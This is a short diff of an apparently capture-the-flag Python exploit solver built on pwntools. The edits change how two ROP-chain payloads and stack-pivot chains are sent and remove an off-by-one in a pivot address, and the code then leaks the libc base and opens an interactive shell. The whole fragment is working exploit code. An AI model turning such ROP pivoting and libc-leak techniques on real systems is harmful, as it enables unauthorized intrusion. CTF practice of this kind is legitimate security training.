@@ -87,8 +87,8 @@ def solve():
         ROPS.pivot
     ]
 
-    io.sendlineafter(b"> ", flat(payload))
-    io.sendlineafter(b"> ", flat(pivot))
+    io.sendafter(b"> ", flat(payload))
+    io.sendafter(b"> ", flat(pivot))
 
     libc.address = extract_libc_base(io)
     log.info(f"LIBC base: {hex(libc.address)}")
@@ -107,12 +107,12 @@ def solve():
     pivot2 = [
         padding,
         ROPS.pop_r4,
-        pivot_point2 + 1,
+        pivot_point2,
         ROPS.pivot
     ]
 
-    io.sendlineafter(b"> ", flat(payload2))
-    io.sendlineafter(b"> ", flat(pivot2))
+    io.sendafter(b"> ", flat(payload2))
+    io.sendafter(b"> ", flat(pivot2))
 
     io.interactive()
 
